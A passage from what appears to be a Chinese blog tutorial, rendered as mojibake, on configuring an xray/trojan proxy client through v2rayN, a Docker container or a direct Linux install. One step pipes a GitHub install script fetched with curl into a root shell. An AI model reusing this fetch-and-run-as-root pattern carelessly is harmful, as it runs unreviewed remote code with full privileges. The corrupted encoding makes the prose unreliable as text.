ä¸‹å¤§æ¦‚èƒ½ç”¨çš„æ–¹æ¡ˆï¼š ï¼‰</p><p>ä½¿ç”¨ <a href="https://github.com/2dust/v2rayN">v2rayN</a> æŒ‰ç…§ä¸‹é¢çš„æ–¹å¼é…ç½®å°±è¡Œï¼Œæ³¨æ„åœ°å€ä»…å†™åŸŸåï¼Œä¸è¦æŠŠ <code>https://</code> å’Œå­è·¯å¾„ä¹Ÿç»™å†™è¿›å»äº†ï¼Œå¦åˆ™ä¼šæŠ¥ <code>too many colon in address</code> çš„é”™è¯¯ï¼Œç«¯å£é»˜è®¤å†™ 443ï¼Œä¼ è¾“æ–¹å¼é‡Œçš„è·¯å¾„å¸¦ä¸Š <code>/</code> ï¼š</p><p><img src="https://s2.loli.net/2024/09/18/8bGpnTSxU716L9v.png"></p><p>ç„¶ååœ¨ç³»ç»Ÿè®¾ç½®é‡Œé…ç½®ä¸€ä¸‹æ‰‹åŠ¨ä»£ç†å³å¯ï¼š</p><p><img src="https://s2.loli.net/2024/09/18/jCRKBgI9yecsL8b.png"></p><p>æµ‹è¯•ï¼ŒæˆåŠŸè¿ç§»åˆ°ç¬”è€…åœ¨ Vultr è´­ä¹°çš„ä½äº Singapore çš„æœåŠ¡å™¨ï¼š</p><p><img src="https://s2.loli.net/2024/09/18/kaslX7NpQe3BLRE.png"></p><h2 id="åœ¨-Linux-ä¸Šè¿›è¡Œè¿æ¥"><a href="#åœ¨-Linux-ä¸Šè¿›è¡Œè¿æ¥" class="headerlink" title="åœ¨ Linux ä¸Šè¿›è¡Œè¿æ¥"></a>åœ¨ Linux ä¸Šè¿›è¡Œè¿æ¥</h2><h3 id="æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Docker-é…ç½®æœ¬åœ°ä»£ç†"><a href="#æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Docker-é…ç½®æœ¬åœ°ä»£ç†" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Docker é…ç½®æœ¬åœ°ä»£ç†"></a>æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Docker é…ç½®æœ¬åœ°ä»£ç†</h3><p>docker ç›¸å¯¹è€Œè¨€æ¯”è¾ƒå®‰å…¨ï¼ˆ <del>å¦‚æœçœŸæœ‰äººæŠ½è±¡åˆ°åœ¨ä¸Šæ¸¸ä¾›åº”é“¾é‡Œæ”¾ä¸€ä¸ª kernel é€šæ€ 0day æ¥åŠ«æŒğŸ‘´çš„ç”µè„‘å½“è‚‰é¸¡é‚£ğŸ‘´ä¹Ÿè®¤äº†</del> ï¼‰ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰å¯¹ä¸åŒå‘è¡Œç‰ˆç¯å¢ƒçš„è¦æ±‚ï¼Œå› æ­¤ç¬”è€…é¦–æ¨ä½¿ç”¨ docker é…ç½®æœ¬åœ°çš„ä»£ç†ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠ http è¯·æ±‚è½¬å‘åˆ° Docker å®¹å™¨ä¸­çš„ xray ä»£ç†å°±è¡Œ</p><p>æˆ‘ä»¬é¦–å…ˆæŒ‰æƒ¯ä¾‹ç¼–å†™ä¸€ä»½ <code>config.json</code> ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> æœ¬åœ°ä»£ç†ç«¯å£ä¾‹å¦‚<span class="hljs-number">11450</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> æœ¬åœ°ä»£ç†ç«¯å£ä¾‹å¦‚<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„å¯†ç &quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/ä½ çš„å­è·¯å¾„&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>å› ä¸ºé•œåƒå…¶å®ä¸éš¾å†™æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è‡ªå·±å†™ä¸€ä¸ª Dockerfile ï¼Œä¸è¿‡å®˜æ–¹å®‰è£…è„šæœ¬ä»…é€‚ç”¨äº systemdï¼ˆ <del>è™½ç„¶ç¬”è€…ä¸ä½¿ç”¨ OpenRC ä½†æ˜¯è¿˜æ˜¯éœ‡æ€’äº†</del> ï¼‰ï¼Œä½†æ˜¯ç›´æ¥æŠŠ xray çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶æ‹‰ä¸‹æ¥è¿è¡Œå…¶å®ä¹Ÿè¡Œï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v1.8.24/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ„å»ºé•œåƒï¼Œå¯åŠ¨å®¹å™¨ï¼Œå¹¶è®©å®¹å™¨ä¸ä¸»æœºä½¿ç”¨åŒæ ·çš„ç½‘ç»œï¼š</p><blockquote><p>ä¹‹æ‰€ä»¥ä¸ç”¨ç«¯å£è½¬å‘æ˜¯å› ä¸º docker çš„ç«¯å£è½¬å‘åœ¨ç¬”è€…æœ¬åœ°ä¼¼ä¹æœ‰äº›å°é—®é¢˜ï¼Œæ²¡æœ‰åŠæ³•è¿æ¥â€¦â€¦ï¼ˆä½†æ˜¯è½¬å‘ ssh åˆå¯ä»¥ï¼Œæœ‰ç‚¹å¥‡æ€ªï¼‰</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t a3xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=a3xray --network=host a3xray</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ‰¾è‡ªå·±æ¡Œé¢ç¯å¢ƒå¯¹åº”çš„ Proxy è®¾ç½®å³å¯ï¼Œä»¥ä¸‹æ˜¯ KDE ç¯å¢ƒä¸‹é…ç½®æˆåŠŸçš„ç•Œé¢ï¼š</p><p><img src="https://s2.loli.net/2024/09/19/HcYb9dBQ6vDImMO.png"></p><h3 id="æ–¹æ³•äºŒï¼šç›´æ¥åœ¨çœŸæœºä¸Šå®‰è£…å®¢æˆ·ç«¯"><a href="#æ–¹æ³•äºŒï¼šç›´æ¥åœ¨çœŸæœºä¸Šå®‰è£…å®¢æˆ·ç«¯" class="headerlink" title="æ–¹æ³•äºŒï¼šç›´æ¥åœ¨çœŸæœºä¸Šå®‰è£…å®¢æˆ·ç«¯"></a>æ–¹æ³•äºŒï¼šç›´æ¥åœ¨çœŸæœºä¸Šå®‰è£…å®¢æˆ·ç«¯</h3><p>ç¬”è€…ç‰©ç†æœºä½¿ç”¨çš„æ˜¯ openSUSE Tumbleweedï¼Œé»˜è®¤ä½¿ç”¨ systemd ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨å®˜æ–¹æä¾›çš„ä¸€é”®å¼å®‰è£…è„šæœ¬åœ¨æœ¬åœ°è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)</span>&quot;</span> @ install</span><br></code></pre></td></tr></table></figure><p>ç„¶åç¼–å†™ <code>/usr/local/etc/xray/config.json</code> ï¼š</p><blockquote><p>è¿™é‡Œç¬”è€…ç›´æ¥ç”¨ Windows ä¸Š v2rayN è‡ªåŠ¨å¯¼å‡ºçš„ï¼Œå†ç¨å¾®æ ¼å¼åŒ–äº†ä¸€ä¸‹ï¼Œæ‡’å¾—è‡ªå·±å†™äº†ï¼šï¼‰</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 